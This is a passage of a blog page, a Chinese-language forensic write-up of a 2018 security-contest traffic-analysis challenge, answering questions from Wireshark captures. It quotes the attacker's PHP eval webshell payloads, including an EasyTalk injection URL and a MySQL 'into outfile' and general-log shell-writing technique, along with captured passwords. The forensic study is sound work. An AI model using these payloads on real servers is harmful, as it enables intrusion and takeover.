@@ -1,0 +1,2926 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" >
+    <title>
+        
+        2018.5.18信息安全铁人三项赛数据赛题解 · Sky&#39;s blog
+        
+    </title>
+    <link rel="icon" href= /assets/favicon.ico>
+    <!-- TODO: 在font-face加载完毕后改变字体  -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/webfont/1.6.28/webfontloader.js"></script>
+    <!-- 提前加载place holder  -->
+    <style type="text/css">
+        @font-face {
+            font-family: 'Oswald-Regular';
+            src: url(/font/Oswald-Regular.ttf);
+        }
+    </style>
+    <style type="text/css">
+        .site-intro {
+            position: relative;
+            width: 100%;
+            height: 50vh;
+            overflow: hidden;
+            box-shadow: -0.1rem 0 0.5rem 0 rgba(0, 0, 0, 0.5);
+        }
+        .site-intro-placeholder {
+            position: absolute;
+            z-index: -2;
+            top: 0;
+            left: 0px;
+            width: calc(100% + 300px);
+            height: 100%;
+            background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+            background-position: center center;
+            transform: translate3d(-226px, 0, 0);
+            animation: gradient-move 2.5s ease-out 0s 1;
+        }
+        @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+    <link rel="stylesheet" href = /css/style.css?v=20180120 />
+    <script src="//cdn.staticfile.org/jquery/3.2.1/jquery.min.js" defer></script>
+    
+    <script src="/scripts/main.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Sky&#39;s blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">2018.5.18信息安全铁人三项赛数据赛题解</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Sky's blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-img" style="background-image: url(/intro/post.png)"></div>
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            2018.5.18信息安全铁人三项赛数据赛题解
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <!-- 文章页标签  -->
+            
+                <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-href = web>web</a>
+    
+</div>
+            
+            <script>window._bd_share_config = { "common": { "bdSnsKey": {}, "bdText": "", "bdMini": "2", "bdMiniList": false, "bdPic": "", "bdStyle": "1", "bdSize": "16" }, "share": {} }; with (document) 0[(getElementsByTagName('head')[0] || body).appendChild(createElement('script')).src = "/static/api/js/share.js"];</script>
+            <div class="post-intro-meta">
+                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                <span class="post-intro-time">2018/05/31</span>
+                <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                    <span class="iconfont-archer">&#xe604;</span>
+                    <span id="busuanzi_value_page_pv"></span>
+                </span>
+                <span class="shareWrapper">
+                    <span class="iconfont-archer shareIcon">
+                        &#xe601;
+                    </span>
+                    <span class="bdsharebuttonbox">
+                        <a href="#" class="bds_more shareText" data-cmd="more">Share</a>
+                    </span>
+                </span>
+            </div>
+        
+    </div>
+</div>
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <script>
+            var browser = {
+                    versions: function () {
+                        var u = window.navigator.userAgent;
+                        return {
+                            userAgent: u,
+                            trident: u.indexOf('Trident') > -1, //IE内核
+                            presto: u.indexOf('Presto') > -1, //opera内核
+                            webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+                            gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+                            mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+                            ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+                            android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+                            iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+                            iPad: u.indexOf('iPad') > -1, //是否为iPad
+                            webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+                            weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+                            uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+                        };
+                    }()
+                }
+
+            function fontLoaded(){
+                console.log('font loaded');
+                if (document.getElementsByClassName('site-intro-meta')) {
+                    document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+                    document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+                    var postIntroTags = document.getElementsByClassName('post-intro-tags')[0],
+                        postIntroMeat = document.getElementsByClassName('post-intro-meta')[0];
+                        if (postIntroTags) {
+                            postIntroTags.classList.add('post-fade-in');
+                        }
+                        if (postIntroMeat) {
+                            postIntroMeat.classList.add('post-fade-in');
+                        }
+                    }
+                }
+                
+            console.log("userAgent:" + browser.versions.userAgent);
+            // UC不支持跨域，所以直接显示
+            if (browser.versions.uc) {
+                console.log("UCBrowser");
+                fontLoaded();
+            } else {
+                WebFont.load({
+                    custom: {
+                        families: ['Oswald-Regular']
+                    },
+                    loading: function () {  //所有字体开始加载
+                        // console.log('loading');
+                    },
+                    active: function () {  //所有字体已渲染
+                        fontLoaded();
+                    },
+                    inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+                        console.log('inactive: timeout');
+                        fontLoaded();
+                    },
+                    timeout: 7000 // Set the timeout to two seconds
+                });
+            }
+        </script>
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>1.黑客的IP是多少<br>2.服务器1.99的web服务器使用的CMS及其版本号(请直接复制)<br>3.服务器拿到的webshell的网址(请输入url解码后的网址)<br>4.服务器1.99的主机名<br>5.网站根目录的绝对路径(注意最后加斜杠)<br>6.黑客上传的第一个文件名称是什么<br>7.黑客进行内网扫描，扫描的端口都有哪些(端口从小到大，用英文逗号分隔)<br>8.服务器2.88的ftp服务账号密码(格式：账号/密码)<br>9.黑客成功登陆ftp的时间(格式：10:15:36)<br>10.黑客在ftp中下载的敏感文件名称是什么<br>11.服务器2.88中用户名为admin_zz的web后台管理员的密码<br>12.服务器2.88的mysql账号密码(格式：账号/密码)<br>13.服务器2.88的mysql服务中有和admin有关的三个表，请按照黑客的查询顺序作答，使用空格分隔<br>14.请列出黑客设置的genreal log的绝对路径(将路径复制出来，区分大小写)<br>15.路由器的品牌、型号、版本(请直接复制粘贴)<br>16.列出路由器的所有IP地址(格式：从小到大，用英文逗号分隔)<br>17.在路由器的端口监控中，监控端口和被监控端口分别是多少，例，1号端口监控2/3/4号端口:1–&gt;2,3,4<br>18.路由器一共有几个接口?其中有几个WAN口启用?有几个LAN口启用(格式:用英文逗号分隔)<br>19.路由器的系统路由表中一共有几条?第三条的子网掩码是多少。例: 255 255.255.0则为24 (格式:用英文逗号分隔)<br>20.路由器的5Gwif名称是什么，信道是多少(格式:名称信道)</p>
+<h2 id="第一个数据包"><a href="#第一个数据包" class="headerlink" title="第一个数据包"></a>第一个数据包</h2><p>上来先过滤http流量，随意浏览<br><img src="/images/5.18wireshark (1).jpg"><br>可以发现202.1.1.2执行了phpinfo()命令<br>无疑是黑客ip，而192.168.1.99显然就是受害者了<br>我们进一步利用这一特点，进行过滤<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ip.addr == 202.1.1.2 || ip.addr == 192.168.1.99) &amp;&amp; http</span><br></pre></td></tr></table></figure></p>
+<p>为确定服务器使用的CMS和版本号，我们抽取一个192.168.1.99的响应，看看前端响应里会不会包含<br>随意跟踪一个ip.src==192.168.1.99的http响应<br>我们定位到Powered by<br>不难发现<br><img src="/images/5.18wireshark (2).jpg"><br>版本号和CMS一目了然<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EasyTalk X2.0.1</span><br></pre></td></tr></table></figure></p>
+<p>同时利用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ip.addr == 202.1.1.2 || ip.addr == 192.168.1.99) &amp;&amp; http</span><br></pre></td></tr></table></figure></p>
+<p>过滤不难看出有如下url<br><img src="/images/5.18wireshark (3).jpg"><br>解码后得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://202.1.1.1/index.php/module/action/param1/$&#123;@print(eval($_POST[c]))&#125;</span><br></pre></td></tr></table></figure></p>
+<p>即可利用的webshell<br>随后想起有phpinfo，即可以泄露大量服务器信息，我们去拷贝下响应的html源码<br><img src="/images/5.18wireshark (4).jpg"><br>保存到本地，打开即可看到许多信息<br>服务器1.99的主机名和网站根目录的绝对路径一目了然<br><img src="/images/5.18wireshark (5).jpg"><br><img src="/images/5.18wireshark (6).jpg"><br>答案分别为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">simplefight1</span><br><span class="line">/var/www/html/easytalk</span><br></pre></td></tr></table></figure></p>
+<p>接着既然要找出上传文件，于是使用过滤<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.addr == 202.1.1.2 &amp;&amp; http.request.method == POST</span><br></pre></td></tr></table></figure></p>
+<p>不然找到如下信息<br><img src="/images/5.18wireshark (7).jpg"><br>解码z1查看文件名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/easytalk/scan.php</span><br></pre></td></tr></table></figure></p>
+<p>发现为scan.php<br>顾名思义，扫描，于是我们过滤这个文件，查看黑客的扫描<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.addr == 202.1.1.2 &amp;&amp; http contains &quot;scan.php&quot;</span><br></pre></td></tr></table></figure></p>
+<p>问题一目了然<br><img src="/images/5.18wireshark (8).jpg"><br>可见起始ip:192.168.0.1<br>结束ip:192.168.3.255<br>扫描端口:21,80,8080,1433,3306<br>至此我们归纳一下答案<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.黑客的IP是多少</span><br><span class="line">202.1.1.2</span><br><span class="line">2.服务器1.99的web服务器使用的CMS及其版本号(请直接复制)</span><br><span class="line">EasyTalk X2.0.1</span><br><span class="line">3.服务器拿到的webshell的网址(请输入url解码后的网址)</span><br><span class="line">http://202.1.1.1/index.php/module/action/param1/$&#123;@print(eval($_POST[c]))&#125;</span><br><span class="line">4.服务器1.99的主机名</span><br><span class="line">simplefight1</span><br><span class="line">5.网站根目录的绝对路径(注意最后加斜杠)</span><br><span class="line">/var/www/html/easytalk</span><br><span class="line">6.黑客上传的第一个文件名称是什么</span><br><span class="line">scan.php</span><br><span class="line">7.黑客进行内网扫描，扫描的端口都有哪些(端口从小到大，用英文逗号分隔)</span><br><span class="line">21,80,8080,1433,3306</span><br></pre></td></tr></table></figure></p>
+<h2 id="第二个数据包"><a href="#第二个数据包" class="headerlink" title="第二个数据包"></a>第二个数据包</h2><p>既然要找ftp的账号密码，肯定是利用之前打下的机子作为跳板，进一步攻击内网<br>那么此时我们只需要过滤<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.src == 192.168.1.99 &amp;&amp; ftp</span><br></pre></td></tr></table></figure></p>
+<p>即可查看所有登录信息<br><img src="/images/5.18wireshark (9).jpg"><br>选中最后一项<br>不难看出账户密码为:<code>administrator:123456</code><br>然后再过滤<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.addr == 192.168.1.99 &amp;&amp; ftp</span><br></pre></td></tr></table></figure></p>
+<p>找到对应密码为123456登录的消息<br><img src="/images/5.18wireshark (10).jpg"><br>可以看到登录时间<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">14:07:15</span><br></pre></td></tr></table></figure></p>
+<p>可以发现黑客在第二个数据包里只进行了操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CWD 改变工作目录</span><br><span class="line">PWD 打印工作目录，返回主机的当前目录</span><br><span class="line">PASV 进入被动模式</span><br><span class="line">LIST 如果指定了文件或目录，返回其信息；否则返回当前工作目录的信息</span><br></pre></td></tr></table></figure></p>
+<p>而下载命令为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RETR 传输文件副本</span><br></pre></td></tr></table></figure></p>
+<p>所以我们切换到第三个数据包中</p>
+<h2 id="第三个数据包"><a href="#第三个数据包" class="headerlink" title="第三个数据包"></a>第三个数据包</h2><p>我们根据之前的分析，使用命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.src == 192.168.1.99 &amp;&amp; ftp contains &quot;RETR&quot;</span><br></pre></td></tr></table></figure></p>
+<p>即可一目了然<br><img src="/images/5.18wireshark (11).jpg"><br>下载文件名为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/phpStudy/WWW/config/config_db.php</span><br></pre></td></tr></table></figure></p>
+<p>我们跟进查看一下，毕竟是重要配置文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.addr == 192.168.1.99 &amp;&amp; ftp-data</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/5.18wireshark (12).jpg"><br>可以得到配置<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">con_db_host = "localhost"</span></span><br><span class="line"><span class="comment">con_db_id   = "root"</span></span><br><span class="line"><span class="comment">con_db_pass	= "S1mp13zz"</span></span><br><span class="line"><span class="comment">con_db_name = "met"</span></span><br><span class="line"><span class="comment">tablepre    =  "met_"</span></span><br><span class="line"><span class="comment">db_charset  =  "utf8";</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>即mysql账号密码:<code>localhost/S1mp13zz</code><br>下面我们去寻找admin_zz的密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.addr == 192.168.1.99 &amp;&amp; http contains &quot;admin_zz&quot;</span><br></pre></td></tr></table></figure></p>
+<p>答案同样一目了然<br><img src="/images/5.18wireshark (13).jpg"><br>密码为<code>1q2w3e4r</code><br>然后需要我们查找admin相关的表，但是我们知道，表前缀为:<code>met_</code><br>所以我们可以过滤<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.addr == 192.168.1.99 &amp;&amp; mysql contains &quot;met_&quot;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/5.18wireshark (14).jpg"><br>结果依旧显然，正好3个查询，3个有关管理员的表也出现了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from met_admin_array</span><br><span class="line">select * from met_admin_column</span><br><span class="line">select * from met_admin_table</span><br></pre></td></tr></table></figure></p>
+<p>即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">met_admin_array,met_admin_column,met_admin_table</span><br></pre></td></tr></table></figure></p>
+<p>我们来总结一下这个阶段的答案<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">8.服务器2.88的ftp服务账号密码(格式：账号/密码)</span><br><span class="line">administrator:123456</span><br><span class="line">9.黑客成功登陆ftp的时间(格式：10:15:36)</span><br><span class="line">14:07:15</span><br><span class="line">10.黑客在ftp中下载的敏感文件名称是什么</span><br><span class="line">config_db.php</span><br><span class="line">11.服务器2.88中用户名为admin_zz的web后台管理员的密码</span><br><span class="line">1q2w3e4r</span><br><span class="line">12.服务器2.88的mysql账号密码(格式：账号/密码)</span><br><span class="line">localhost/S1mp13zz</span><br><span class="line">13.服务器2.88的mysql服务中有和admin有关的三个表，请按照黑客的查询顺序作答，使用空格分隔</span><br><span class="line">met_admin_array met_admin_column met_admin_table</span><br></pre></td></tr></table></figure></p>
+<h2 id="第四个数据包"><a href="#第四个数据包" class="headerlink" title="第四个数据包"></a>第四个数据包</h2><p>我们直接过滤<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.addr == 192.168.1.99 &amp;&amp; mysql</span><br></pre></td></tr></table></figure></p>
+<p>不难发现，黑客想在192.168.2.88的机器上留shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &apos;&lt;?php eval($_POST[a]);?&gt;&apos; into outfile &apos;c:/phpStudy/WWW/aaa.php&apos;</span><br></pre></td></tr></table></figure></p>
+<p>但是返回了错误<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</span><br></pre></td></tr></table></figure></p>
+<p>于是黑客进行了一系列的更改<br>在后续的一条操作中，可以明显看到<br><img src="/images/5.18wireshark (15).jpg"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file=&apos;c:/phpStudy/WWW/config/config.php&apos;</span><br></pre></td></tr></table></figure></p>
+<p>路径为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:/phpStudy/WWW/config/config.php</span><br></pre></td></tr></table></figure></p>
+<p>同时可以确定192.168.2.88为一台windows</p>
+<h2 id="路由器hacking"><a href="#路由器hacking" class="headerlink" title="路由器hacking"></a>路由器hacking</h2><p>剩下的5个题均为路由器的题，这就很难受了，之前一直很少接触路由器的流量分析<br>后来转念一想，路由器一般都是192.168.0.1吧<br>于是我查了一下这个ip<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.addr == 192.168.0.1 &amp;&amp; http</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/5.18wireshark (16).jpg"><br>发现的确是有web服务的<br>我们进行查找<br><img src="/images/5.18wireshark (17).jpg"><br>很快，在第一个返回200的包里就找到了答案<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;id&quot;:1, &quot;result&quot;:&#123; &quot;locale&quot;:&quot;zh_CN&quot;, &quot;force&quot;:false, &quot;radio&quot;:2, &quot;model&quot;:&quot;TL-WAR1300L v1.0&quot; &#125;, &quot;error_code&quot;:&quot;0&quot; &#125;</span><br></pre></td></tr></table></figure></p>
+<p>答案为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TL-WAR1300L v1.0</span><br></pre></td></tr></table></figure></p>
+<p>我们系统的看一下这些流量，不难发现，黑客先进行了密码爆破<br><img src="/images/5.18wireshark (18).jpg"><br>而之前的登录error_code均为700<br>可见最后黑客成功登入<br>然后黑客进行了read选项<br><img src="/images/5.18wireshark (19).jpg"><br>才有了如上的版本信息<br>然后我们看到黑客进行了如下操作<br><img src="/images/5.18wireshark (20).jpg"><br>然后得到回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&#123; </span><br><span class="line"> &quot;id&quot;: 1, </span><br><span class="line"> &quot;result&quot;: &#123; </span><br><span class="line">  &quot;normal&quot;: [&#123; </span><br><span class="line">   &quot;py_isup&quot;: false, </span><br><span class="line">   &quot;ipaddr&quot;: &quot;&quot;, </span><br><span class="line">   &quot;t_type&quot;: &quot;ethernet&quot;, </span><br><span class="line">   &quot;t_isup&quot;: &quot;disconnect&quot;, </span><br><span class="line">   &quot;t_name&quot;: &quot;WAN1&quot;, </span><br><span class="line">   &quot;t_linktype&quot;: &quot;dhcp&quot; </span><br><span class="line">  &#125;,&#123; </span><br><span class="line">   &quot;py_isup&quot;: false, </span><br><span class="line">   &quot;ipaddr&quot;: &quot;&quot;, </span><br><span class="line">   &quot;t_type&quot;: &quot;ethernet&quot;, </span><br><span class="line">   &quot;t_isup&quot;: &quot;disconnect&quot;, </span><br><span class="line">   &quot;t_name&quot;: &quot;WAN2&quot;, </span><br><span class="line">   &quot;t_linktype&quot;: &quot;dhcp&quot; </span><br><span class="line">  &#125;,&#123; </span><br><span class="line">   &quot;py_isup&quot;: false, </span><br><span class="line">   &quot;ipaddr&quot;: &quot;&quot;, </span><br><span class="line">   &quot;dhcp_status&quot;: &quot;on&quot;, </span><br><span class="line">   &quot;t_type&quot;: &quot;ethernet&quot;, </span><br><span class="line">   &quot;t_name&quot;: &quot;LAN1&quot;, </span><br><span class="line">   &quot;t_isup&quot;: &quot;disconnect&quot;, </span><br><span class="line">   &quot;t_linktype&quot;: &quot;static&quot; </span><br><span class="line">  &#125;, &#123; </span><br><span class="line">   &quot;py_isup&quot;: false, </span><br><span class="line">   &quot;ipaddr&quot;: &quot;&quot;, </span><br><span class="line">   &quot;dhcp_status&quot;: &quot;on&quot;, </span><br><span class="line">   &quot;t_type&quot;: &quot;ethernet&quot;, </span><br><span class="line">   &quot;t_name&quot;: &quot;LAN2&quot;, </span><br><span class="line">   &quot;t_isup&quot;: &quot;disconnect&quot;, </span><br><span class="line">   &quot;t_linktype&quot;: &quot;static&quot; </span><br><span class="line">  &#125;, &#123; </span><br><span class="line">   &quot;py_isup&quot;: false, </span><br><span class="line">   &quot;ipaddr&quot;: &quot;&quot;, </span><br><span class="line">   &quot;dhcp_status&quot;: &quot;on&quot;, </span><br><span class="line">   &quot;t_type&quot;: &quot;ethernet&quot;, </span><br><span class="line">   &quot;t_name&quot;: &quot;LAN3&quot;, </span><br><span class="line">   &quot;t_isup&quot;: &quot;disconnect&quot;, </span><br><span class="line">   &quot;t_linktype&quot;: &quot;static&quot; </span><br><span class="line">  &#125;] </span><br><span class="line"> &#125;, </span><br><span class="line"> &quot;error_code&quot;: &quot;0&quot; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>目前2个wan和2个LAN都是关闭状态，<code>py_isup</code>清晰可见<br>接着后面又出现了一个类似的内容<br><img src="/images/5.18wireshark (21).jpg"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;id&quot;:1,</span><br><span class="line">&quot;result&quot;:&#123;</span><br><span class="line">    &quot;normal&quot;:[</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;py_isup&quot;:true,</span><br><span class="line">            &quot;ipaddr&quot;:&quot;202.1.1.1&quot;,</span><br><span class="line">            &quot;t_type&quot;:&quot;ethernet&quot;,</span><br><span class="line">            &quot;t_isup&quot;:&quot;connect&quot;,</span><br><span class="line">            &quot;t_name&quot;:&quot;WAN1&quot;,</span><br><span class="line">            &quot;t_linktype&quot;:&quot;static&quot; </span><br><span class="line">    &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;py_isup&quot;:true,</span><br><span class="line">            &quot;ipaddr&quot;:&quot;192.168.12.173&quot;,</span><br><span class="line">            &quot;t_type&quot;:&quot;ethernet&quot;,</span><br><span class="line">            &quot;t_isup&quot;:&quot;internet&quot;,</span><br><span class="line">            &quot;t_name&quot;:&quot;WAN2&quot;,</span><br><span class="line">            &quot;t_linktype&quot;:&quot;dhcp&quot; </span><br><span class="line">    &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;py_isup&quot;:true,</span><br><span class="line">            &quot;ipaddr&quot;:&quot;192.168.0.1&quot;,</span><br><span class="line">            &quot;dhcp_status&quot;:&quot;on&quot;,</span><br><span class="line">            &quot;t_type&quot;:&quot;ethernet&quot;,</span><br><span class="line">            &quot;t_name&quot;:&quot;LAN1&quot;,</span><br><span class="line">            &quot;t_isup&quot;:&quot;connect&quot;,</span><br><span class="line">            &quot;t_linktype&quot;:&quot;static&quot; </span><br><span class="line">    &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;py_isup&quot;:true,</span><br><span class="line">            &quot;ipaddr&quot;:&quot;192.168.0.1&quot;,</span><br><span class="line">            &quot;dhcp_status&quot;:&quot;on&quot;,</span><br><span class="line">            &quot;t_type&quot;:&quot;ethernet&quot;,</span><br><span class="line">            &quot;t_name&quot;:&quot;LAN2&quot;,</span><br><span class="line">            &quot;t_isup&quot;:&quot;connect&quot;,</span><br><span class="line">            &quot;t_linktype&quot;:&quot;static&quot; </span><br><span class="line">    &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;py_isup&quot;:false,</span><br><span class="line">            &quot;ipaddr&quot;:&quot;192.168.0.1&quot;,</span><br><span class="line">            &quot;dhcp_status&quot;:&quot;on&quot;,</span><br><span class="line">            &quot;t_type&quot;:&quot;ethernet&quot;,</span><br><span class="line">            &quot;t_name&quot;:&quot;LAN3&quot;,</span><br><span class="line">            &quot;t_isup&quot;:&quot;disconnect&quot;,</span><br><span class="line">            &quot;t_linktype&quot;:&quot;static&quot; </span><br><span class="line">    &#125; </span><br><span class="line">] </span><br><span class="line">&#125;,</span><br><span class="line">&quot;error_code&quot;:&quot;0&quot; 